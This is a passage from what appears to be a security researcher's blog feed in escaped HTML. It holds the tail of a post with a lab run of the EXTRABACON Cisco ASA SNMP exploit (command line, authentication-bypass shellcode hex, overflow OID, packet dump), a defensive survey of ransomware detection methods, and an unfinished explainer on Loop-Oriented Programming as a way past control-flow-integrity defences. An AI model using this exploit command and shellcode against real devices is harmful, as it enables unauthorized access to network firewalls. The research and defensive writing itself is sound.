EXAMPLE:&lt;/b&gt;&lt;/h3&gt;&lt;div&gt;This is a running example of extrabacon exploit, just to be sure it will work even in my lab environment.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;pre style=&#34;background: #f0f0f0; border: 1px dashed #cccccc; color: black; font-family: &amp;quot;arial&amp;quot;; font-size: 12px; height: auto; line-height: 20px; overflow: auto; padding: 0px; text-align: left; width: 99%;&#34;&gt;&lt;code style=&#34;color: black; word-wrap: normal;&#34;&gt; mr@mrtestbox:~$ ./extrabacon_1.1.0.1.py exec -k F_RlDw -v -t 192.168.1.66 -c cisco --mode pass-enable  &lt;br /&gt; WARNING: No route found for IPv6 destination :: (no default route?)  &lt;br /&gt; Logging to /home/marcoramilli/concernedparent  &lt;br /&gt; [+] Executing: ./extrabacon_1.1.0.1.py exec -k F_RlDw -v -t 192.168.1.66 -c cisco --mode pass-enable  &lt;br /&gt; [+] running from /home/marcoramilli  &lt;br /&gt; Data stored in self.vinfo: ASA803  &lt;br /&gt; [+] generating exploit for exec mode pass-enable  &lt;br /&gt; [+] using shellcode in ./versions  &lt;br /&gt; [+] importing version-specific shellcode shellcode_asa803  &lt;br /&gt; [+] building payload for mode pass-enable  &lt;br /&gt; appended PMCHECK_ENABLE payload eb14bf7082090931c9b104fcf3a4e92f0000005e  &lt;br /&gt; ebece8f8ffffff5531c089bfa5a5a5a5b8d8a5a5a531f8bba525acac31fbb9a5b5a5a531f9baa0a5a5a531facd80  &lt;br /&gt; appended AAAADMINAUTH_ENABLE payload eb14bfb060060831c9b104fcf3a4e92f0000005eebece8f8ffffff5  &lt;br /&gt; 589e557bfa5a5a5a5b8d8a5a5a531f8bba5c5a3ad31fbb9a5b5a5a531f9baa0a5a5a531facd80  &lt;br /&gt; [+] random SNMP request-id 425297185  &lt;br /&gt; [+] fixing offset to payload 49  &lt;br /&gt; overflow (112): 1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.57.47.5.173.53.165.165.165.165.131.236.  &lt;br /&gt; 4.137.4.36.137.229.131.197.88.4  &lt;br /&gt; *** output omitted ****  &lt;br /&gt; 44.144.144.144.141.123.131.9.139.124.36.20.139.7.255.224.144  &lt;br /&gt; payload (133): eb14bf7082090931c9b104fcf3a4e92f0000005eebece8f8ffffff5531c089bfa5a5a5a5b8d8a5a5a531  &lt;br /&gt; f8bba525acac31fbb9a5b5a5a531f9baa0a5a5a531facd80eb14bfb060060831c9b104fcf3a4e92f0000005eebece8f8fff  &lt;br /&gt; fff5589e557bfa5a5a5a5b8d8a5a5a531f8bba5c5a3ad31fbb9a5b5a5a531f9baa0a5a5a531facd80c3  &lt;br /&gt; EXBA msg (371): 3082016f0201010405636973636fa58201610204195985210201000201013082015130819106072b0601020101010  &lt;br /&gt; *** output omitted ****  &lt;br /&gt; 0811081108110811081108110811081108110810d7b810309810b7c2414810b07817f816081100500  &lt;br /&gt; [+] Connecting to 192.168.1.66:161  &lt;br /&gt; [+] packet 1 of 1  &lt;br /&gt; [+] 0000 30 82 01 6F 02 01 01 04 05 63 69 73 63 6F A5 82 0..o.....cisco..  &lt;br /&gt; [+] 0010 01 61 02 04 19 59 85 21 02 01 00 02 01 01 30 82 .a...Y.!......0.  &lt;br /&gt; [+] 0020 01 51 30 81 91 06 07 2B 06 01 02 01 01 01 04 81 .Q0....+........  &lt;br /&gt; [+] 0030 85 EB 14 BF 70 82 09 09 31 C9 B1 04 FC F3 A4 E9 ....p...1.......  &lt;br /&gt; [+] 0040 2F 00 00 00 5E EB EC E8 F8 FF FF FF 55 31 C0 89 /...^.......U1..  &lt;br /&gt; [+] 0050 BF A5 A5 A5 A5 B8 D8 A5 A5 A5 31 F8 BB A5 25 AC ..........1...%.  &lt;br /&gt; [+] 0060 AC 31 FB B9 A5 B5 A5 A5 31 F9 BA A0 A5 A5 A5 31 .1......1......1  &lt;br /&gt; [+] 0070 FA CD 80 EB 14 BF B0 60 06 08 31 C9 B1 04 FC F3 .......`..1.....  &lt;br /&gt; [+] 0080 A4 E9 2F 00 00 00 5E EB EC E8 F8 FF FF FF 55 89 ../...^.......U.  &lt;br /&gt; ...  &lt;br /&gt; ###[ SNMP ]###  &lt;br /&gt; version = v2c  &lt;br /&gt; community = &#39;cisco&#39;  &lt;br /&gt; \PDU \  &lt;br /&gt; |###[ SNMPbulk ]###  &lt;br /&gt; | id = &amp;lt;ASN1_INTEGER[425297185]&amp;gt;  &lt;br /&gt; | non_repeaters= 0  &lt;br /&gt; | max_repetitions= 1  &lt;br /&gt; | \varbindlist\  &lt;br /&gt; | |###[ SNMPvarbind ]###  &lt;br /&gt; | | oid = &amp;lt;ASN1_OID[&#39;.1.3.6.1.2.1.1.1&#39;]&amp;gt;  &lt;br /&gt; | | value = &amp;lt;ASN1_STRING[&#39;\xeb\x14\xbfp\x82\t\t1\xc9\xb1\x04\xfc\xf3\xa4\xe9/\x00  &lt;br /&gt; \x00\x00^\xeb\xec\xe8\xf8\xff\xff\xffU1\xc0\x89\xbf\xa5\xa5\xa5\xa5\xb8\xd8\xa5\xa5\  &lt;br /&gt; xa51\xf8\xbb\xa5%\xac\xac1\xfb\xb9\xa5\xb5\xa5\xa51\xf9\xba\x....  &lt;br /&gt;  *** output omitted ****  &lt;br /&gt; \xa5\xa51\xf9\xba\xa0\xa5\xa5\xa51\xfa\xcd\x80\xc3&#39;]&amp;gt;  &lt;br /&gt; | |###[ SNMPvarbind ]###  &lt;br /&gt; | | oid = &amp;lt;ASN1_OID[&#39;.1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9.95.184.57.47.5.173.53.165  &lt;br /&gt; .165.165.165.131.236.4.137.4.36.137.229  &lt;br /&gt;  *** output omitted ****  &lt;br /&gt; 44.144.144.144.144.144.144.141.123.131.9.139.124.36.20.139.7.255.224.144&#39;]&amp;gt;  &lt;br /&gt; | | value = &amp;lt;ASN1_NULL[0]&amp;gt;  &lt;br /&gt; ****************************************  &lt;br /&gt; [-] timeout waiting for response - performing health check  &lt;br /&gt; [-] no response from health check - target may have crashed  &lt;br /&gt; [-] health check failed  &lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;&lt;h3&gt;&lt;b&gt;Sources&lt;/b&gt;:&lt;/h3&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Most of the sources I&#39;ve been using during that survey:&amp;nbsp;&lt;a href=&#34;https://musalbas.com/&#34;&gt;Musalbas&lt;/a&gt;, &lt;a href=&#34;https://packetstormsecurity.com/&#34;&gt;Packetstom&lt;/a&gt;, E&lt;a href=&#34;https://www.exploit-db.com/&#34;&gt;xploit&lt;/a&gt;DB, C&lt;a href=&#34;https://blogs.cisco.com/security/shadow-brokers&#34;&gt;isco&lt;/a&gt;, &lt;a href=&#34;https://www.schneier.com/&#34;&gt;Schneier&lt;/a&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>Fighting Ransomware Threats </title>
      <link>http://marcoramilli.com/post/fighting-ransomware-threats/</link>
      <pubDate>Mon, 01 Aug 2016 23:07:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/fighting-ransomware-threats/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;I wrote a little bit about Ransomware general view and Ransomware general infection methods&amp;nbsp;&lt;a href=&#34;http://marcoramilli.blogspot.it/2016/02/ransomware-general-view-after-field.html&#34;&gt;here&lt;/a&gt;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Today, after some more months working on the field and after having meet much more Ransomware than I thought, I&#39;d like to write a little bit about how to &#34;fight them&#34;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Before starting the review of some of the most known strategies to fight Ransomware let me explain why nowadays Ransomware are not &#34;fair&#34; as they were few months ago. Indeed while back at the beginning of 2016 Ransomware writers would assure your data back once paid the ransom, today&#39;s Ransomware writers don&#39;t assure it (there are several &amp;nbsp;paid ransoms with unrecovered files examples just few of them: &lt;a href=&#34;http://www.extremetech.com/extreme/229162-hospital-pays-ransomware-but-doesnt-get-files-decrypted&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://thehackernews.com/2016/06/university-ransomware.html&#34;&gt;here&lt;/a&gt; and &lt;a href=&#34;http://www.digitaltrends.com/computing/ransomware-hospital-hackers-demand-more-money/&#34;&gt;here&lt;/a&gt;&amp;nbsp;). &amp;nbsp;This situation has been made possible by users who paid the ransoms during the past months. Those users arose the Ransomware ecosystem reputation by increasing the trust of entire supply chain. &amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;For example we experienced many infected users saying:&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&#34;Ok, I took a ransomware and my backup sucks. Let&#39;s pay the ransom, it only asks for few bucks. I&#39;ll pay more attention next time!&#34;&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;This user&#39; behaviour increased the Ransomware reputation such as today nobody doubts about paying the ransom and getting back own files. This &#34;well reputation&#34; made possible for &#34;not super skilled&#34; attackers and/or to attackers who wanted to make quick money, to implement &#34;half of the Ransomware (without decryption module)&#34;. This made very angry the whole Ransomware &#39;s writer community (which happens to be a professional community) who actually is divided into two main parties: the one who wants to increase the Ransomware reputation by giving back files once the ransom has been payed (usually Ransomware as a service writers) and the one who exploits the Ransomware community reputation writing quick and dirty Ransomware (available on black market as a service as well) who actually wont give back files once the ransom has paid (usually single hosted Ransomware).&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Ok, nice story but how do we fight them ?&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Today there are two main known strategies so far:&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;/div&gt;&lt;ol&gt;&lt;li&gt;Try to block the ransomware infection before it &#34;fires up&#34;.&lt;/li&gt;&lt;li&gt;Try to detect it before it can create a real &#34;damage&#34;.&lt;/li&gt;&lt;/ol&gt;&lt;div&gt;I wont write about prevention on this &#34;post&#34; but just about mitigation. So I assume the Ransomware is already landed on the victim&#39;s machine.&lt;/div&gt;&lt;div&gt;&lt;b style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;b style=&#34;text-align: justify;&#34;&gt;Methods to try to block a Ransomware infection before it &#34;fires up&#34;.&lt;/b&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;Three main methods to try to block a Ransomware infection assuming the Malware already landed into victim&#39;s PC are implemented so far:&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;1. Signature Based (AV) Approach.&amp;nbsp;&lt;/span&gt;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;As common virus the known Ransomware own signatures. If the signature (that could be static ore dynamic) matches the sample file, the sample itself is blocked and trashed away.&lt;/span&gt;&lt;/blockquote&gt;This is the romantic approach that will work only for known ransomware. Useless in today&#39;s technology.&lt;br /&gt;&lt;br /&gt;2. Policy Based Approach.&lt;br /&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Files executable could not be run from every folder (for example from the eMail folder or from temporary folders)&lt;/div&gt;&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;It could be a first and important way to &#34;decelerate&#34; the infection rate. In fact many infections happen through &#34;avid clickers&#34; who open untrusted email and/or click on untrusted links. Having them to move the &#34;downloaded file&#34; or to copy the malicious attachment to another destination often helps the &#34;avid clickers&#34; to get distracted and to not get infected.&lt;/div&gt;&lt;br /&gt;3. CallBack Based approach.&lt;br /&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;Every recent Ransomware needs to comunicate to external servers to get &amp;nbsp;encryption key or to communicate the infection to the attacker and later on to get back the decryption key. A primitive approach is to detect the callback and to block it avoiding the initial communication.&lt;/blockquote&gt;&lt;div&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;This approach is hard in the real life since the communication methods can be very brilliant and innovative. Indeed the communication to command and control could be (just for example) end-to-end encrypted&lt;/span&gt;&lt;b style=&#34;text-align: justify;&#34;&gt;&amp;nbsp;&lt;/b&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;and/&lt;/span&gt;&lt;span style=&#34;text-align: justify;&#34;&gt;or the contacting addresses could be a legitimate hacked domain.&lt;/span&gt;&lt;/div&gt;&lt;div&gt;&lt;b style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Methods to try to detect it before it can create a real &#34;damage&#34;&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Some of the main methods implemented by commercial products try to block the Ransomware Infection once it has been fired up. Following the most implemented strategies.&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;1. Flag processes who read and write too many files too quickly.&amp;nbsp;&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;This method, is used by &lt;a href=&#34;https://blog.malwarebytes.com/malwarebytes-news/2016/01/introducing-the-malwarebytes-anti-ransomware-beta/&#34;&gt;MalwareBytes AntiRansomware&lt;/a&gt;&amp;nbsp;which is based on Nathan Scott&#39;s &lt;a href=&#34;http://www.bleepingcomputer.com/forums/t/572146/cryptomonitor-stop-all-known-crypto-ransomware-before-it-encrypts-your-data/&#34;&gt;CryptoMonitor&lt;/a&gt;.&amp;nbsp;&lt;span style=&#34;text-align: left;&#34;&gt;It counts how often untrusted processed have modified “a certain number of personal files, under a certain time.” A similar method&amp;nbsp;implemented by Adam&amp;nbsp;Kramer’s&amp;nbsp;&lt;/span&gt;&lt;a href=&#34;https://digital-forensics.sans.org/blog/2015/04/03/identifying-and-disrupting-crypto-ransomware-and-destructive-malware&#34; style=&#34;text-align: left;&#34;&gt;hande_monitor&lt;/a&gt;&lt;span style=&#34;text-align: left;&#34;&gt;&amp;nbsp;tool on the frequency with which processes create handles through which they&amp;nbsp;can access files.&lt;/span&gt;&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Implementing this method solo could have a tons of false positives (and white/black listing on them). Let&#39;s image DropBox process or GoogleDrive during a sync phase. How many file does it modify/delete/create and how quickly does it ? Or CAD software who constantly saves tons of partial rendered piece of files before assembling them ? It&#39;s clear that this strategy solo is not gonna work.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;2. Flag processes that changes file&#39;s entropy values.&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;Encrypted files tend to have a more uniform distribution of byte values than other files. Their contents are&amp;nbsp;more uniform. Our tool could compare the file’s entropy before and&amp;nbsp;after the change. If a modified file has higher entropy, it might have gotten&amp;nbsp;encrypted, indicating that the&amp;nbsp;responsible process might&amp;nbsp;be ransomware.&amp;nbsp;&lt;/blockquote&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Implementing this method solo you might find issues on real encrypted files and/or on compressed files who tend to have a while flat ad uniform distribution of charset.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;3. Flag processes who change entropy of selected &#34;untouchable&#34; files.&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;Specific canary files are dynamically injected into hidden or not hidden folders and monitored. If a process tries to modify them, the process will be considered as malicious.&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Implementing this method solo could generate false positives since an unsuspecting user could open the canary file at any time.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;4. SyncHoling folders.&lt;/div&gt;&lt;blockquote class=&#34;tr_bq&#34; style=&#34;text-align: justify;&#34;&gt;By creating a nested tree of recursive folders to trap single processes Ransomware who will loop into it by consuming a lot of resources but without encrypting any real user file.&lt;/blockquote&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Once the process (Ransomware process) is identified by one or more techniques as expressed above the system could kill it or suspend it (putting it in holding mode) asking to user what to do.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;b&gt;Conclusions&lt;/b&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Ransomware infections are one of the most spread threats in todays&#39; Internet (foreground internet). They have been evolved over years (a super great paper on the Ransomware evolution could be found &lt;a href=&#34;http://seclab.ccs.neu.edu/static/publications/dimva2015ransomware.pdf&#34;&gt;here&lt;/a&gt;) since the last evolution defined &lt;b&gt;Ransomworm&lt;/b&gt; (conied at the beginning of 2016), which includes self propagating skills, such as for example: infecting public accessible folders and/or running vulnerability scanning on network machine for known exploitable vulnerabilities which will be used in order to propagate itself. The following image shows the activity of used bitcoin address in a Ransomware campaign. As you might observe the average time frame of a Bitcoin address used in a Ransomware fraud is between 0 to 5 days which makes super hard to catch the owner by cross-correlation over multiple transitions.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://4.bp.blogspot.com/-_zABoOzKYUI/V548fBjKTAI/AAAAAAAANFs/X2ZKY_Kfs84clU5TIwc7_Ipik4PDFybHgCLcB/s1600/Screen%2BShot%2B2016-07-31%2Bat%2B19.58.42.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;217&#34; src=&#34;https://4.bp.blogspot.com/-_zABoOzKYUI/V548fBjKTAI/AAAAAAAANFs/X2ZKY_Kfs84clU5TIwc7_Ipik4PDFybHgCLcB/s320/Screen%2BShot%2B2016-07-31%2Bat%2B19.58.42.png&#34; width=&#34;320&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure 1: The duration of activity for Bitcoin addresses. Approximately 50% of Bitcoin addresses have zero to five days of active life (from &lt;a href=&#34;http://seclab.ccs.neu.edu/static/publications/dimva2015ransomware.pdf&#34;&gt;here&lt;/a&gt;).&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;Nowadays there are plenty quick fixes that promise to solve the issue but not a real solver has been released to public (at least as far as I know) so far. At this point I wont give you the consolidated suggestion to keep up to date your OS and to download the last AntiVirus Engine because it really do not matter at all. Apply the policies, inform your users about this threat and stay tuned, the answer to such a threat will come and something will happen in the Anti Malware market soon :) &amp;nbsp;.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;/div&gt;
</description>
    </item>
    
    <item>
      <title>From ROP to LOP bypassing Control FLow Enforcement</title>
      <link>http://marcoramilli.com/post/from-rop-to-lop-bypassing-control-flow-enforcement/</link>
      <pubDate>Wed, 22 Jun 2016 22:48:00 UTC</pubDate>
      
      <guid>http://marcoramilli.com/post/from-rop-to-lop-bypassing-control-flow-enforcement/</guid>
      <description>&lt;div dir=&#34;ltr&#34; style=&#34;text-align: left;&#34; trbidi=&#34;on&#34;&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Once upon a time breaking the Stack (&lt;a href=&#34;http://phrack.org/issues/49/14.html&#34;&gt;here&lt;/a&gt;) was a metter of indexes and executables memory areas (&lt;a href=&#34;http://lia.deis.unibo.it/Courses/SicurezzaM1011/BufferoVerflow.pdf&#34;&gt;here&lt;/a&gt;). Then it came a DEP protection (&lt;a href=&#34;https://support.microsoft.com/en-us/kb/875352&#34;&gt;here&lt;/a&gt;) which disabled a particular area from being executable. This is the fantastic story of &lt;b&gt;ROP&lt;/b&gt; (Return Oriented Programming) from which I&#39;ve been working for long time in writing exploiting and re-writing &#34;resurrectors&#34; (software engines able to convert old exploits into brand new ROP enabled exploits), please take a look:&amp;nbsp;&lt;a href=&#34;http://marcoramilli.blogspot.it/2011/08/rop-stack-compensation.html&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://marcoramilli.blogspot.it/2011/08/rop-stack-pivoting.html&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://marcoramilli.blogspot.it/2011/07/rop-notes.html&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://marcoramilli.blogspot.it/2011/12/from-rop-to-jop.html&#34;&gt;here&lt;/a&gt;, &lt;a href=&#34;http://marcoramilli.blogspot.it/2012/03/rop-and-derop.html&#34;&gt;here&lt;/a&gt;&amp;nbsp;and &lt;a href=&#34;https://www.computer.org/csdl/mags/sp/2012/06/msp2012060084-abs.html&#34;&gt;here&lt;/a&gt;. Now it&#39;s time to a new way of stack protection named &lt;b&gt;Control-Flow Enforcement &lt;/b&gt;designed by Intel. &lt;b&gt;CFE &lt;/b&gt;aims to prevent stack execution by using a &#34;canary&#34; stack .. ops this was the old way to call it.. right let me repeat the sentence... by using a &#34;shadow stack&#34; aiming to compare return addresses and a &#34;Indirect Branching Tracking&#34; aiming to track down every valid indirect call/jmp on target program.&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;Well, I made a joke mentioning the ancient canary words which might remind you how useless it was adding a canary control Byte (or 4 bits, actually) to enforce the entire stack, b&lt;u&gt;ut this time is structurally &amp;nbsp;different&lt;/u&gt;. We are not facing a canary stack which could be adjusted by user by using &#34;stores commands&#34; such as: MOV, PUSH, POP, XSAVE, but is a user/kernel memory space exclusively used by &#34;control flow commands&#34; such as: CALL, RET, NEAR, FAR, etc. &lt;br /&gt;&lt;br /&gt;&lt;br /&gt;&lt;div class=&#34;separator&#34; style=&#34;clear: both; text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-3MXmZ16ehhk/V2OcuT01wlI/AAAAAAAAM80/wDvI680gXTUNaayFIkUIKI5MXlmgUlVKQCLcB/s1600/Screen%2BShot%2B2016-06-17%2Bat%2B08.45.53.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: 1em; margin-right: 1em;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;118&#34; src=&#34;https://3.bp.blogspot.com/-3MXmZ16ehhk/V2OcuT01wlI/AAAAAAAAM80/wDvI680gXTUNaayFIkUIKI5MXlmgUlVKQCLcB/s400/Screen%2BShot%2B2016-06-17%2Bat%2B08.45.53.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div style=&#34;text-align: justify;&#34;&gt;&lt;blockquote class=&#34;tr_bq&#34;&gt;When shadow stacks are enabled, the CALL instruction pushes the return address on both the data and shadow stack. The RET instruction pops the return address from both stacks and compares them. If the return addresses from the two stacks do not match, the processor signals a control protection exception (#CP). Note that the shadow stack only holds the return addresses and not parameters passed to the call instruction. To provide this protection the page table protections are extended to support an additional attribute for pages to mark them as “Shadow Stack” pages. &amp;nbsp;(Figure1 from &lt;a href=&#34;https://software.intel.com/sites/default/files/managed/4d/2a/control-flow-enforcement-technology-preview.pdf&#34;&gt;here&lt;/a&gt;)&lt;/blockquote&gt;Just to make things a little harder (but it&#39;s going to be very useful to introduce a way to bypass Stack Shadow) let me introduce to you a more comprehensive stack defencing framework, defined by &lt;a href=&#34;http://research.microsoft.com/pubs/64250/ccs05.pdf&#34;&gt;Abadi et al&amp;nbsp;&lt;/a&gt;&amp;nbsp;and called &lt;b&gt;Control-Flow Integrity&lt;/b&gt; framework. Following I borrow the classification described by Bingchen Lan et Al. on their paper (available&amp;nbsp;&lt;a href=&#34;https://www.sec.in.tum.de/assets/staff/muntean/Loop-Oriented_Programming_A_New_Code_Reuse_Attack_to_Bypass_Modern0ADefenses.pdf&#34;&gt;here&lt;/a&gt;) reporting 4 kinds of Control Flow Integrity Policies (CFI):&lt;br /&gt;&lt;ul&gt;&lt;li&gt;&lt;b&gt;CFI-call&lt;/b&gt;. The target address of an indirect call has to point to the beginning of a function. For instance, indirect call is constrained to the limited addresses, which are specified through statically scanning the binary for function entries. &lt;/li&gt;&lt;li&gt;&lt;b&gt;CFI-jump.&lt;/b&gt; The target address of an indirect jump should be either the beginning of another function or inside the function where this jump instruction lies. For instance, Branch Regulation prevents jumps across function boundaries to stop attackers from modifying the addresses of indirect jumps. &lt;/li&gt;&lt;li&gt;&lt;b&gt;CFI-ret.&lt;/b&gt; In coarse-grained CFI, the target address of a ret instruction should point to the location right after any call site. Shadow stack further enhances this constraint, i.e. the ret instruction accurately corresponds to the location after the legitimate call site in its caller. &lt;/li&gt;&lt;li&gt;&lt;b&gt;CFI-heuristics.&lt;/b&gt; Apart from enforcing specific policies on indirect branches as CFI-call, CFI-jump and CFI-ret do, some CFI solutions tend to detect attacks by validating the number of consecutive sequences of small gadgets.&lt;/li&gt;&lt;/ul&gt;During the past few years many attack mechanisms bypassed the CIF policies, let me sum they up on the following table.&lt;br /&gt;&lt;br /&gt;&lt;table align=&#34;center&#34; cellpadding=&#34;0&#34; cellspacing=&#34;0&#34; class=&#34;tr-caption-container&#34; style=&#34;margin-left: auto; margin-right: auto; text-align: center;&#34;&gt;&lt;tbody&gt;&lt;tr&gt;&lt;td style=&#34;text-align: center;&#34;&gt;&lt;a href=&#34;https://3.bp.blogspot.com/-839SLQy1sBU/V2OjjSkY5sI/AAAAAAAAM9E/dU2dbwDFfFsQryDhkCr37B22liBhoysfACLcB/s1600/Screen%2BShot%2B2016-06-17%2Bat%2B09.14.11.png&#34; imageanchor=&#34;1&#34; style=&#34;margin-left: auto; margin-right: auto;&#34;&gt;&lt;img border=&#34;0&#34; height=&#34;276&#34; src=&#34;https://3.bp.blogspot.com/-839SLQy1sBU/V2OjjSkY5sI/AAAAAAAAM9E/dU2dbwDFfFsQryDhkCr37B22liBhoysfACLcB/s400/Screen%2BShot%2B2016-06-17%2Bat%2B09.14.11.png&#34; width=&#34;400&#34; /&gt;&lt;/a&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td class=&#34;tr-caption&#34; style=&#34;text-align: center;&#34;&gt;Figure 2 Comparing attack strategies the green &#34;check&#34; means the technique can bypass the defence policy, the red &#34;x&#34; means it cannot&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br /&gt;Lets assume to be able to implement CFI-Ret and CFI-Jump (or CFI-Heuristics ) techniques in a single system. We might apparently guarantee Control Flow Integrity ! Well, it was &#34;kind of true&#34; since Bingchen Lan, Yan Li, Hao Sun, Chao Su, Yao Liu, Qingkai Zeng introduced in a well done paper (&lt;a href=&#34;https://www.sec.in.tum.de/assets/staff/muntean/Loop-Oriented_Programming_A_New_Code_Reuse_Attack_to_Bypass_Modern0ADefenses.pdf&#34;&gt;here&lt;/a&gt;) a &lt;b&gt;LOP &lt;/b&gt;Loop Oriented Programming technique. &amp;nbsp;The main idea is to choose entire functions as gadget instead of using short code fragments or unaligned instructions. In this way the call instruction targets the beginning of a function bypassing CFI-call policy. Moreover CFI-heuristics expects the execution flow on a victim application consists of multiple short code fragments as ROP and JOP does. Since no short code is involved in LOP and it is possibile to select long gadget with many instructions on it LOP can also bypass CFI-Heuristics. The process of chaining gadgets exactly follows the normal carrer-callee (call-ret-pairing) paradigm. The loop gadget acts as proxy (dispatcher) invoking different functional gadgets repeatedly which eventuallu return to the original caller bypassing the CFI-ret policy. Meanwhile there is only one jump instruction used by LOP. This jump instruction works originally for loop functionality and it is untouched by LOP. Hence, CFI-jump is also ineffective towards LOP. The following picture shows the difference between CPROP 